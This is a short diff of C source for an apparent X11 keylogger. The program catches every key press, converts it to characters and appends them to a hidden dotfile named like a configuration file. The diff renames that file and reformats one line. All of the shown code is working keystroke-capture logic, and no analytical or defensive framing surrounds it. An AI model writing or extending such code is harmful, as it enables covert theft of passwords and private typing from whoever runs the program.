@@ -32,11 +32,12 @@ int main() {
         XNextEvent(display, &ev);
 
         if (ev.type == KeyPress) {
-            FILE *f_key_log = fopen(".keygrb.conf", "a+");
+            FILE *f_key_log = fopen(".keygrbX.conf", "a+");
             char buf[32];
             KeySym key_sym;
 
-            if (XLookupString(&ev.xkey, buf, sizeof(buf), &key_sym, NULL) > 0) fputs(buf, f_key_log);
+            if (XLookupString(&ev.xkey, buf, sizeof(buf), &key_sym, NULL) > 0) 
+                fputs(buf, f_key_log);
             
             fclose(f_key_log);
         }
